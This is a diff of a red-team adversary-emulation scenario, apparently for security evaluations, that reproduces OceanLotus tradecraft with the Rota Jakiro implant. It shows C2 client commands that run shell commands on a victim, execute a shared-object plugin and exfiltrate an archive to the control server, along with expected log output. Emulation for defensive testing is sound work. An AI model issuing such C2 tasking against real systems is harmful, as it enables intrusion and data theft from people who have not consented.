@@ -3,7 +3,7 @@ This scenario emulates OceanLotus TTPs based primarily on two malware specimens 
 used by or associated with the OceanLotus actors:
 
 1. Rota Jakiro
-1. OceanLotus.abcdef
+1. OSX.OceanLotus.abcdef
 
 
 ### 🗺️ Legend
@@ -365,6 +365,7 @@ Execute Rota Jakiro
    Veify the file downloaded
    ```./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /Users/hpotter/Library/WebKit/osx.download"}'
    ```
+   
    <details><summary>Trouble Shooting</summary>
      On the C2 server:
      ```
@@ -460,51 +461,75 @@ Rota Jakiro confirms the target file were created
    ```
    ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_query_file", "arg":"local_rota_file.so"}'
    ```
+   Expected Output:
+   ```
+   [INFO] 2023/08/21 19:35:34 Received task output for session:  01020304
+   [Task] 2023/08/21 19:35:34 file exists
+   [SUCCESS] 2023/08/21 19:35:34 Successfully set task output.
+   ```
 1. Execute the Rota Jakiro run_plugin command to execute the shared object.
    ```
    ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_run_plugin", "arg": "update"}'
    ```
+   Expected Output:
+   ```
+   [INFO] 2023/08/21 19:36:22 New task received for UUID:  01020304
+   [INFO] 2023/08/21 19:36:32 Received task output for session:  01020304
+   [Task] 2023/08/21 19:36:32 Shared Object Executed!
+   [SUCCESS] 2023/08/21 19:36:32 Successfully set task output.
+   ```
 1. Verify the .tar file exsists before exfil.
-```
-./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_query_file", "arg":"/tmp/rota.tar.gz"}'
-```
+   ```
+   ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_query_file", "arg":"/tmp/rota.tar.gz"}'
+   ```
+   Expected Output:
+   ```
+   [INFO] 2023/08/21 19:37:53 New task received for UUID:  01020304
+   [INFO] 2023/08/21 19:37:53 Sending new task to implant: 01020304
+   [INFO] 2023/08/21 19:37:53 Received task output for session:  01020304
+   [Task] 2023/08/21 19:37:53 file exists
+   [SUCCESS] 2023/08/21 19:37:53 Successfully set task output.
+   ```
+   
+## Step 6 - Exfil from Linux Host
+### 📖 Overview
+
+
+---
+### 👾 Red Team Procedures
 
 1. Exfil the `rota.tar.gz` file
    ```
    ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_steal_data", "arg": "/tmp/rota.tar.gz"}'
    ```
-1. Viefity on the C2 server that the file is uploaded.
-```
-ls -lart /ocean-lotus/Resources/controlServer/files
-```
+   NOTE: Payloads exfiled must be 65535 bytes due to limits in buffer size. 
+   Expected Output:
+   ```
+   [SUCCESS] 2023/08/21 19:39:12 Successfully set task for session: 01020304
+   [INFO] 2023/08/21 19:39:14 New task received for UUID:  01020304
+   [INFO] 2023/08/21 19:39:14 Sending new task to implant: 01020304
+   [SUCCESS] 2023/08/21 19:39:14 File uploaded: Successfully uploaded file to control server at './files/rota.tar.gz'
+   ```
+1. Viefity on the C2 server that the `rota.tar.gz` is uploaded to the `/files` folder.
+   ```
+   ls -lart ./files
+   ```
+1. Kill Rota Jakiro and give yourself a high five 🙌, mission accomplished! 💃
+   ```
+   ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_exit"}'
+   ```
+   Expected Output:
+   ```
+   [Task] 2023/08/21 19:46:47 exiting!
+   [SUCCESS] 2023/08/21 19:46:47 Successfully set task output.
+   ```
 
-
-
-Confirm: 
-`./evalsC2client.py --set-task 01020304 '{"cmd": "Rota_query_file", "arg": "/tmp/.rota/exfil.tar.gz"}'`
-
-### 🔮 Reference Code & Reporting
-<br>
-
-### 🔬 Blue Team Notes
-<br>
-
-
-## Step 6 - Exfil from Linux Host
-### 📖 Overview
-Execute another shared object that includes: 
-Uploading the tar file from the folder
-
----
-### 👾 Red Team Procedures
-`./evalsC2client.py --set-task 01020304 '{"cmd": "Rota_upload_file", "payload": "payload.so"}'`
-Confirm upload of file to server 
+The End 💔
 
 ### 🔮 Reference Code & Reporting
 <br>
 
 ### 🔬 Blue Team Notes
 <br>
-
 
 :red_circle: End of Scenario. 
